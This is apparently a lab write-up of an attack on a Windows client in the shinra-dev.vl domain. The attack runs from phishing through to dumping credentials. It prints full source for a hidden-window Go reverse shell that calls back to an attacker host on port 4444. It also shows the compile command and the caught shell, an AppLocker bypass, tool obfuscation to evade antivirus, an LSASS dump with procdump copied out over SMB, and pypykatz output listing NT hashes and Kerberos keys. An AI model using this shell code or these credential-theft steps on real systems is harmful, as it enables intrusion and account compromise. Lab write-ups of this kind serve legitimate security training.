The initial UDP scan shows the following:

```bash
└─$ nmap -F -sU 172.16.11.10
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-20 14:44 +0100
Nmap scan report for 172.16.11.10
Host is up (0.013s latency).
Not shown: 99 open|filtered udp ports (no-response)
PORT    STATE SERVICE
137/udp open  netbios-ns

Nmap done: 1 IP address (1 host up) scanned in 2.46 seconds

```

Where instead the TCP scan shows much more informations:

```bash
PORT     STATE SERVICE       REASON         VERSION
135/tcp  open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 64
3389/tcp open  ms-wbt-server syn-ack ttl 64 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SHINRA-DEV
|   NetBIOS_Domain_Name: SHINRA-DEV
|   NetBIOS_Computer_Name: CLIENT01
|   DNS_Domain_Name: shinra-dev.vl
|   DNS_Computer_Name: client01.shinra-dev.vl
|   DNS_Tree_Name: shinra-dev.vl
|   Product_Version: 10.0.19041
|_  System_Time: 2026-03-20T13:54:27+00:00
|_ssl-date: 2026-03-20T13:55:07+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=client01.shinra-dev.vl
| Issuer: commonName=client01.shinra-dev.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-05T07:10:37
| Not valid after:  2026-05-07T07:10:37
| MD5:     e58c 297f fb66 eac4 a609 dcf4 b215 4964
| SHA-1:   2815 ee64 a281 181a cf11 7d6c 73a9 cc2c 9ac5 8d7c
| SHA-256: 2e31 ed17 09d5 3454 bdb2 f2db abc6 a446 53fc 2a37 9d98 55a9 e74b 6fe9 daf6 b18b
| -----BEGIN CERTIFICATE-----
| MIIC8DCCAdigAwIBAgIQYq+8aKqEKZZG0xfCZg4ZjjANBgkqhkiG9w0BAQsFADAh
| MR8wHQYDVQQDExZjbGllbnQwMS5zaGlucmEtZGV2LnZsMB4XDTI1MTEwNTA3MTAz
| N1oXDTI2MDUwNzA3MTAzN1owITEfMB0GA1UEAxMWY2xpZW50MDEuc2hpbnJhLWRl
| di52bDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAJsXt/AGqvefdbFs
| /OcjIKMuA2xvLupmqfg7ij07dahFl4CEMrNEMjLyZsyAktaIYiEUI6TtPn0bPBP0
| WONoeau7WMl3/AUEWA9ItVR9XfFKqEmaMxq7YPY8FOCWSrfOvPdk4D9Djr7tppgJ
| 7vDYQnLPicUT9jumV9Oll3TzpwNNo+FyiPm6c9Iq1NmhB/DU+DKQ4GDU8jF6tMNo
| e1yuxr+iFq4KtlLfhN+fnlIAjRkGjYuU13GnyYrz7lwmHEj+pbaC67279me07i/y
| KLcidKURcUvZ+1vyshrOPCwRccc/TeJuu+xIrNa0FkKATj/1AmP6yT6SNYymk2b2
| Jxyr+XUCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQw
| MA0GCSqGSIb3DQEBCwUAA4IBAQByB+/f9wgHb0GPzXCzdiZwr7vt8ZNM6WPHoBUS
| yjWAnWz3ig17+XSI80ISOK9RLjLQgW7hUmp1zox8+ogWtp2EzLqv/C2TvNQUVUdM
| IK/xPSwkeBSKyJ+ocGQYVVkNyHjC14BETa7Q5F44zffnv5RWZN6AqnJ+okp/mjo5
| VP/iYxYZO6n3cxmxS4xbWqG4Sg9wDC0xwnVt8w01dFRXLv5HKnvzzSBCw7cxIReI
| ldUcpWNQ+1tOuBT8BOo+QW77epXJIjoT131LS/DN8mwcEIpsC36f2X6MC2xINrE1
| wSa4u5hmMxYKAGMzYT8qdHtCFx13EtqL1ocR5wWpgJKL5Lat
|_-----END CERTIFICATE-----
5040/tcp open  unknown       syn-ack ttl 64
5985/tcp open  http          syn-ack ttl 64 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.98%E=4%D=3/20%OT=135%CT=%CU=%PV=Y%G=N%TM=69BD51BB%P=x86_64-pc-linux-gnu)
SEQ(SP=100%GCD=1%ISR=110%TI=I%CI=I%II=RI%TS=A)
SEQ(SP=F9%GCD=1%ISR=110%TI=I%CI=I%II=RI%TS=A)
OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=40%CD=S)

```

# Phishing

Now the third flag(the missing one) seems spinning around the conversation between Daniel and Ashley in Roundcube:

![83e673be76e9757681a028700805c7a6.png](../../../_resources/83e673be76e9757681a028700805c7a6.png)

And I can try with some files first:

![2eb93da493b336b3cad53e09cf762a60.png](../../../_resources/2eb93da493b336b3cad53e09cf762a60.png)

Now since she is still waiting the file I will try to use a custom go shell that only crafts the TCP connection nothing more(https://github.com/akbarq/goshell)

```
//GO reverse shell
package main

import (
    "bufio"
    "net"
    "os/exec"
    "syscall"
    
)

var (
    modkernel32 = syscall.NewLazyDLL("kernel32.dll")
    moduser32   = syscall.NewLazyDLL("user32.dll")

    procGetConsoleWindow = modkernel32.NewProc("GetConsoleWindow")
    procShowWindow       = moduser32.NewProc("ShowWindow")
)

const (
    SW_HIDE = 0
)

func hideConsoleWindow() {
    consoleWindow, _, _ := procGetConsoleWindow.Call()
    if consoleWindow != 0 {
        _, _, _ = procShowWindow.Call(consoleWindow, uintptr(SW_HIDE))
    }
}

func main() {
    hideConsoleWindow()
    // Change the IP address below to the address of the target system
    conn, err := net.Dial("tcp", "172.16.11.20:4444") 
    if err != nil {
        panic(err)
    }

    for {
        message, err := bufio.NewReader(conn).ReadString('\n')
        if err != nil {
            panic(err)
        }

        cmd := exec.Command("cmd", "/C", message)
        output, err := cmd.Output()
        if err != nil {
            conn.Write([]byte(err.Error() + "\n"))
        } else {
            conn.Write(output)
        }
    }
}
```

And the file compilled, so far I am using the WEB01 to accomodate the callback as I suspect the victim client will not be able to reach back to me and I suspect I need to add the listeners instead. EDIT: I had to use a C one based as the GO version ends always bigger than 2MB which is the size cap for an attachment.

```
x86_64-w64-mingw32-gcc shell.c -o shell.exe -lws2_32
```

![4f253e9921e8e94cea60be906e6f8cf1.png](../../../_resources/4f253e9921e8e94cea60be906e6f8cf1.png)

And I have a  working shell:

```
root@web01:/tmp# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 172.16.11.10 58534
Microsoft Windows [Version 10.0.19045.2364]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami   
whoami 
shinra-dev\ashleigh.lewis

C:\Windows\system32>hostname
hostname
client01

C:\Windows\system32>
```

# Road to Root

Now the user doesn't posses any interesting rights nor I don't have any interesting access to documents so I tried to upload and execute winpeas but for some reasons I see that there might be Applocker policy in places?

![814860d791eefc4acffb1511fd2f71e3.png](../../../_resources/814860d791eefc4acffb1511fd2f71e3.png)

Indeed I see that **"programdata"** should be allowed:

```bash
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections


PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba
Name                : (Default Rule) All signed packaged apps
Description         : Allows members of the Everyone group to run packaged apps that are signed.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {c:\programdata\dev\mail\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 61eed32c-5e3a-4157-b2d9-e4972b07e7d2
Name                : mail
Description         : 
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files 
                      folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name                : (Default Rule) All files located in the Windows folder
Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {C:\programdata\attachments\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : b7d88f0e-40cf-403a-a45b-8306d4730f9b
Name                : Attachments
Description         : 
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
Name                : (Default Rule) All files
Description         : Allows members of the local Administrators group to run all applications.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : b7af7102-efde-4369-8a89-7a6a392d1473
Name                : (Default Rule) All digitally signed Windows Installer files
Description         : Allows members of the Everyone group to run digitally signed Windows Installer files.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\Installer\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 5b290184-345a-4453-b184-45305f6d9a54
Name                : (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
Description         : Allows members of the Everyone group to run all Windows Installer files located in 
                      %systemdrive%\Windows\Installer.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*.*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d
Name                : (Default Rule) All Windows Installer files
Description         : Allows members of the local Administrators group to run all Windows Installer files.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
Name                : (Default Rule) All scripts located in the Program Files folder
Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c
Name                : (Default Rule) All scripts located in the Windows folder
Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : ed97d0cb-15ff-430f-b82c-8d7832957725
Name                : (Default Rule) All scripts
Description         : Allows members of the local Administrators group to run all scripts.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow


```

And as I was suspecting, I can easily bypass the execution from another folder:

![26088e368ddef4a383d95395bdc40ca5.png](../../../_resources/26088e368ddef4a383d95395bdc40ca5.png)

Now checking the history file I can see traces of a possible sticky notes+

```bash
C:\>type C:\Users\ashleigh.lewis\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\ashleigh.lewis\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
stikynot
C:\Program Files\WindowsApps\Microsoft.MicrosoftStickyNotes_4.5.7.0_x64__8wekyb3d8bbwe
"C:\Program Files\WindowsApps\Microsoft.MicrosoftStickyNotes_4.5.7.0_x64__8wekyb3d8bbwe"
cd C:\Program Files\WindowsApps\Microsoft.MicrosoftStickyNotes_4.5.7.0_x64__8wekyb3d8bbwe
cd "C:\Program Files\WindowsApps\Microsoft.MicrosoftStickyNotes_4.5.7.0_x64__8wekyb3d8bbwe"
dir
.\Microsoft.Notes.exe
explorer .
$ExecutionContext.SessionState.LanguageMode
```

Now one of these SQLite has the credentials:

```bash
PS C:\users\ashleigh.lewis\appdata\local\packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> ls
ls


    Directory: C:\users\ashleigh.lewis\appdata\local\packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         3/24/2026   3:41 AM                DiagOutputDir                                                        
-a----          1/2/2023   8:03 AM           1014 Ecs.dat                                                              
-a----         12/9/2022   5:37 PM           4096 plum.sqlite                                                          
-a----         3/24/2026   3:41 AM          32768 plum.sqlite-shm                                                      
-a----          6/2/2025   8:46 AM         424392 plum.sqlite-wal       
```

And I have some more credentials?

```bash
i._,UU\id=7d77482b-229e-4701:.,     UU\id=7d77482b-229e,
,-,  UU\id=7d77482b-229e-4701-bed3-edc99dcfd9a9 Debugging Account:
\id=c749ba03-f87d-406b-8285-2ccdf2422d09 dev: d3v_2023!
\id=ce128491-884c-4d59-ae90-c094c7c7b8d6 
\id=5ec0ba56-380f-4f0e-9d9e-494213c695e4 Reminder:
\id=f024339c-5f9d-4e67-a638-441aa4f9044f - Buy Milk for the CatManagedPosition=DeviceId:\\?\DISPLAY#Default_Monitor#4&427137e&0&UID0#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=732,16;Size=320,320Yellow0870b9d0-d950-4a30-976e-2260fa5cd1f65af214da-610a-47ca-a678-3cd041ec5d0UU
                                                                                                                                                                                                                                                                                       IAUU

```

And this might mean I get better access via a more stable WINRM? But No I need to obtain a local shell as DEV on the machine but I do need to obfuscate the tool first:  
![6b430a8e41ba1d97156be937a30197ef.png](../../../_resources/6b430a8e41ba1d97156be937a30197ef.png)

And after a quick obfuscation via YAO I can make it work now:  
![ae3473f6060fe20fa1024845cf0495ef.png](../../../_resources/ae3473f6060fe20fa1024845cf0495ef.png)

And I have success again:  
![5d276f0e482e795586af9dac09cf5316.png](../../../_resources/5d276f0e482e795586af9dac09cf5316.png)

This new user has debug privs:

```bash
PS C:\users> whoami /all
whoami /all

USER INFORMATION
----------------

User Name    SID                                          
============ =============================================
client01\dev S-1-5-21-2311587511-4185669600-506192667-1002


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE             Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeDebugPrivilege              Debug programs                       Enabled 
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
PS C:\users> 

```

Now I will temporarly upload procdump.exe and dump the lsass process:

```bash
 v11.1 - Sysinternals process dump utility
Copyright (C) 2009-2025 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[13:17:31]Dump 1 info: Available space: 7918850048
[13:17:31]Dump 1 initiated: C:\windows\tasks\lsass.dmp
[13:17:36]Dump 1 writing: Estimated dump file size is 55 MB.
[13:17:37]Dump 1 complete: 55 MB written in 6.2 seconds
[13:17:37]Dump count reached.

PS C:\windows\tasks> dir
dir


    Directory: C:\windows\tasks


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         3/24/2026   1:17 PM       55996063 lsass.dmp                                                            
-a----         3/24/2026   1:16 PM              0 myeasylog.log                                                        
-a----         3/24/2026   1:16 PM        1339936 procdump.exe                                                         


PS C:\windows\tasks> 

```

And here I had to setup a SMB share since the process was big and the HTTP couldn't allow me to upload to the Powershell Language constrains:

```bash
PS C:\windows\tasks> net use Z: \\172.16.11.20\Shared /user:yovecio Coglione1!
net use Z: \\172.16.11.20\Shared /user:yovecio Coglione1!
The command completed successfully.

PS C:\windows\tasks> ls
ls


    Directory: C:\windows\tasks


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         3/24/2026   1:17 PM       55996063 lsass.dmp                                                            
-a----         3/24/2026   1:16 PM              0 myeasylog.log                                                        
-a----         3/24/2026   1:16 PM        1339936 procdump.exe                                                         


PS C:\windows\tasks> cmd /c copy C:\windows\tasks\lsass.dmp Z:\lsass.dmp
cmd /c copy C:\windows\tasks\lsass.dmp Z:\lsass.dmp
        1 file(s) copied.
PS C:\windows\tasks> 

```

And parsing the file locally with pypykats:

```bash
─$ pypykatz lsa minidump lsass.dmp 
INFO:pypykatz:Parsing file lsass.dmp
FILE: ======== lsass.dmp =======
== LogonSession ==
authentication_id 21640456 (14a3508)
session_id 0
username dev
domainname CLIENT01
logon_server CLIENT01
logon_time 2026-03-24T13:10:49.654281+00:00
sid S-1-5-21-2311587511-4185669600-506192667-1002
luid 21640456
    == MSV ==
        Username: dev
        Domain: CLIENT01
        LM: NA
        NT: 889102200596dfeb9b6a8252856bfadc
        SHA1: ddac3519440b95881d5d89de0718a5d8a934a3cc
        DPAPI: 0000000000000000000000000000000000000000
    == WDIGEST [14a3508]==
        username dev
        domainname CLIENT01
        password None
        password (hex)
    == Kerberos ==
        Username: dev
        Domain: CLIENT01
    == WDIGEST [14a3508]==
        username dev
        domainname CLIENT01
        password None
        password (hex)

== LogonSession ==
authentication_id 476166 (74406)
session_id 1
username Ashleigh.Lewis
domainname SHINRA-DEV
logon_server DC
logon_time 2026-03-24T03:39:43.168656+00:00
sid S-1-5-21-102928273-333185529-3642627421-1111
luid 476166
    == MSV ==
        Username: Ashleigh.Lewis
        Domain: SHINRA-DEV
        LM: NA
        NT: 80c780e59d6785d4a8c7659a47a0b4b9
        SHA1: 8813a8cbbe3601116298794dacf00bc4d02e7cbe
        DPAPI: 639f9c1e56896ef85711d88f23b5e1aa00000000
    == WDIGEST [74406]==
        username Ashleigh.Lewis
        domainname SHINRA-DEV
        password None
        password (hex)
    == Kerberos ==
        Username: Ashleigh.Lewis
        Domain: SHINRA-DEV.VL
        AES128 Key: 80c780e59d6785d4a8c7659a47a0b4b9
        AES256 Key: e9df4f4ac90b4f6dfc44449c0bf354c6f0120af2e2685d335377154205a243c3
    == WDIGEST [74406]==
        username Ashleigh.Lewis
        domainname SHINRA-DEV
        password None
        password (hex)

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server 
logon_time 2026-03-24T03:38:10.673246+00:00
sid S-1-5-19
luid 997
    == Kerberos ==
        Username: 
        Domain: 

== LogonSession ==
authentication_id 76726 (12bb6)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2026-03-24T03:38:09.329505+00:00
sid S-1-5-90-0-1
luid 76726
    == MSV ==
        Username: CLIENT01$
        Domain: SHINRA-DEV
        LM: NA
        NT: 05289ade6824056d4308d30c7d1e14ba
        SHA1: fa90ba97b1a1c9483f422bc29a13dd5580fa4100
        DPAPI: 0000000000000000000000000000000000000000
    == WDIGEST [12bb6]==
        username CLIENT01$
        domainname SHINRA-DEV
        password None
        password (hex)
    == Kerberos ==
        Username: CLIENT01$
        Domain: shinra-dev.vl
        Password: 10bf1c25cfa376012473115a9fd6d1ac49e97e8b00c75f904d91812fa1258abfced1c6478f9cfca54b278758ae67867e0888270018b0a693531850a2b70dac6414ad005a53fc61a0c196cd511f59a9c9cbc2822bf37a81bded62861fe9bbb4712386000c28361aa606b686688b99bea156da7f59bedad68258adff893c22975f85cb0226384566753596e592549c69b34ad1fec94966764703a9a5c594545b9a0b6d16c637682c4b2fa8b1f1af373740c15dfab0783c2208bed2b36e7cf7109f99a8e3721148d4a3b35099ed4cf2300b925c2ab796c9978ca5e0e0937c89ab499f1afa5a47c252d0a9b836af84dd68a5
        password (hex)10bf1c25cfa376012473115a9fd6d1ac49e97e8b00c75f904d91812fa1258abfced1c6478f9cfca54b278758ae67867e0888270018b0a693531850a2b70dac6414ad005a53fc61a0c196cd511f59a9c9cbc2822bf37a81bded62861fe9bbb4712386000c28361aa606b686688b99bea156da7f59bedad68258adff893c22975f85cb0226384566753596e592549c69b34ad1fec94966764703a9a5c594545b9a0b6d16c637682c4b2fa8b1f1af373740c15dfab0783c2208bed2b36e7cf7109f99a8e3721148d4a3b35099ed4cf2300b925c2ab796c9978ca5e0e0937c89ab499f1afa5a47c252d0a9b836af84dd68a5
        AES128 Key: 05289ade6824056d4308d30c7d1e14ba
        AES256 Key: 39d1f37af4d11603890827cd0070e97a055848a220d8c3182ae5d1e2e21981c5
    == WDIGEST [12bb6]==
        username CLIENT01$
        domainname SHINRA-DEV
        password None
        password (hex)

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username CLIENT01$
domainname SHINRA-DEV
logon_server 
logon_time 2026-03-24T03:38:06.751382+00:00
sid S-1-5-20
luid 996
    == MSV ==
        Username: CLIENT01$
        Domain: SHINRA-DEV
        LM: NA
        NT: 05289ade6824056d4308d30c7d1e14ba
        SHA1: fa90ba97b1a1c9483f422bc29a13dd5580fa4100
        DPAPI: 0000000000000000000000000000000000000000
    == WDIGEST [3e4]==
        username CLIENT01$
        domainname SHINRA-DEV
        password None
        password (hex)
    == Kerberos ==
        Username: client01$
        Domain: SHINRA-DEV.VL
        Password: 10bf1c25cfa376012473115a9fd6d1ac49e97e8b00c75f904d91812fa1258abfced1c6478f9cfca54b278758ae67867e0888270018b0a693531850a2b70dac6414ad005a53fc61a0c196cd511f59a9c9cbc2822bf37a81bded62861fe9bbb4712386000c28361aa606b686688b99bea156da7f59bedad68258adff893c22975f85cb0226384566753596e592549c69b34ad1fec94966764703a9a5c594545b9a0b6d16c637682c4b2fa8b1f1af373740c15dfab0783c2208bed2b36e7cf7109f99a8e3721148d4a3b35099ed4cf2300b925c2ab796c9978ca5e0e0937c89ab499f1afa5a47c252d0a9b836af84dd68a5
        password (hex)10bf1c25cfa376012473115a9fd6d1ac49e97e8b00c75f904d91812fa1258abfced1c6478f9cfca54b278758ae67867e0888270018b0a693531850a2b70dac6414ad005a53fc61a0c196cd511f59a9c9cbc2822bf37a81bded62861fe9bbb4712386000c28361aa606b686688b99bea156da7f59bedad68258adff893c22975f85cb0226384566753596e592549c69b34ad1fec94966764703a9a5c594545b9a0b6d16c637682c4b2fa8b1f1af373740c15dfab0783c2208bed2b36e7cf7109f99a8e3721148d4a3b35099ed4cf2300b925c2ab796c9978ca5e0e0937c89ab499f1afa5a47c252d0a9b836af84dd68a5
        AES128 Key: 05289ade6824056d4308d30c7d1e14ba
        AES256 Key: 1940184039ef4b59de48227fb6dd73e818d946d604555ecf126118aa0036c121
    == WDIGEST [3e4]==
        username CLIENT01$
        domainname SHINRA-DEV
        password None
        password (hex)

== LogonSession ==
authentication_id 46602 (b60a)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server 
logon_time 2026-03-24T03:38:04.173249+00:00
sid S-1-5-96-0-1
luid 46602
    == MSV ==
        Username: CLIENT01$
        Domain: SHINRA-DEV
        LM: NA
        NT: 05289ade6824056d4308d30c7d1e14ba
        SHA1: fa90ba97b1a1c9483f422bc29a13dd5580fa4100
        DPAPI: 0000000000000000000000000000000000000000
    == WDIGEST [b60a]==
        username CLIENT01$
        domainname SHINRA-DEV
        password None
        password (hex)
    == Kerberos ==
        Username: CLIENT01$
        Domain: shinra-dev.vl
        Password: 10bf1c25cfa376012473115a9fd6d1ac49e97e8b00c75f904d91812fa1258abfced1c6478f9cfca54b278758ae67867e0888270018b0a693531850a2b70dac6414ad005a53fc61a0c196cd511f59a9c9cbc2822bf37a81bded62861fe9bbb4712386000c28361aa606b686688b99bea156da7f59bedad68258adff893c22975f85cb0226384566753596e592549c69b34ad1fec94966764703a9a5c594545b9a0b6d16c637682c4b2fa8b1f1af373740c15dfab0783c2208bed2b36e7cf7109f99a8e3721148d4a3b35099ed4cf2300b925c2ab796c9978ca5e0e0937c89ab499f1afa5a47c252d0a9b836af84dd68a5
        password (hex)10bf1c25cfa376012473115a9fd6d1ac49e97e8b00c75f904d91812fa1258abfced1c6478f9cfca54b278758ae67867e0888270018b0a693531850a2b70dac6414ad005a53fc61a0c196cd511f59a9c9cbc2822bf37a81bded62861fe9bbb4712386000c28361aa606b686688b99bea156da7f59bedad68258adff893c22975f85cb0226384566753596e592549c69b34ad1fec94966764703a9a5c594545b9a0b6d16c637682c4b2fa8b1f1af373740c15dfab0783c2208bed2b36e7cf7109f99a8e3721148d4a3b35099ed4cf2300b925c2ab796c9978ca5e0e0937c89ab499f1afa5a47c252d0a9b836af84dd68a5
        AES128 Key: 05289ade6824056d4308d30c7d1e14ba
        AES256 Key: 39d1f37af4d11603890827cd0070e97a055848a220d8c3182ae5d1e2e21981c5
    == WDIGEST [b60a]==
        username CLIENT01$
        domainname SHINRA-DEV
        password None
        password (hex)

== LogonSession ==
authentication_id 46601 (b609)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server 
logon_time 2026-03-24T03:38:04.173249+00:00
sid S-1-5-96-0-0
luid 46601
    == MSV ==
        Username: CLIENT01$
        Domain: SHINRA-DEV
        LM: NA
        NT: 05289ade6824056d4308d30c7d1e14ba
        SHA1: fa90ba97b1a1c9483f422bc29a13dd5580fa4100
        DPAPI: 0000000000000000000000000000000000000000
    == WDIGEST [b609]==
        username CLIENT01$
        domainname SHINRA-DEV
        password None
        password (hex)
    == Kerberos ==
        Username: CLIENT01$
        Domain: shinra-dev.vl
        Password: 10bf1c25cfa376012473115a9fd6d1ac49e97e8b00c75f904d91812fa1258abfced1c6478f9cfca54b278758ae67867e0888270018b0a693531850a2b70dac6414ad005a53fc61a0c196cd511f59a9c9cbc2822bf37a81bded62861fe9bbb4712386000c28361aa606b686688b99bea156da7f59bedad68258adff893c22975f85cb0226384566753596e592549c69b34ad1fec94966764703a9a5c594545b9a0b6d16c637682c4b2fa8b1f1af373740c15dfab0783c2208bed2b36e7cf7109f99a8e3721148d4a3b35099ed4cf2300b925c2ab796c9978ca5e0e0937c89ab499f1afa5a47c252d0a9b836af84dd68a5
        password (hex)10bf1c25cfa376012473115a9fd6d1ac49e97e8b00c75f904d91812fa1258abfced1c6478f9cfca54b278758ae67867e0888270018b0a693531850a2b70dac6414ad005a53fc61a0c196cd511f59a9c9cbc2822bf37a81bded62861fe9bbb4712386000c28361aa606b686688b99bea156da7f59bedad68258adff893c22975f85cb0226384566753596e592549c69b34ad1fec94966764703a9a5c594545b9a0b6d16c637682c4b2fa8b1f1af373740c15dfab0783c2208bed2b36e7cf7109f99a8e3721148d4a3b35099ed4cf2300b925c2ab796c9978ca5e0e0937c89ab499f1afa5a47c252d0a9b836af84dd68a5
        AES128 Key: 05289ade6824056d4308d30c7d1e14ba
        AES256 Key: 39d1f37af4d11603890827cd0070e97a055848a220d8c3182ae5d1e2e21981c5
    == WDIGEST [b609]==
        username CLIENT01$
        domainname SHINRA-DEV
        password None
        password (hex)

== LogonSession ==
authentication_id 45607 (b227)
session_id 0
username 
domainname 
logon_server 
logon_time 2026-03-24T03:38:01.892009+00:00
sid None
luid 45607
    == MSV ==
        Username: CLIENT01$
        Domain: SHINRA-DEV
        LM: NA
        NT: 05289ade6824056d4308d30c7d1e14ba
        SHA1: fa90ba97b1a1c9483f422bc29a13dd5580fa4100
        DPAPI: 0000000000000000000000000000000000000000

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username CLIENT01$
domainname SHINRA-DEV
logon_server 
logon_time 2026-03-24T03:38:01.220134+00:00
sid S-1-5-18
luid 999
    == WDIGEST [3e7]==
        username CLIENT01$
        domainname SHINRA-DEV
        password None
        password (hex)
    == Kerberos ==
        Username: client01$
        Domain: SHINRA-DEV.VL
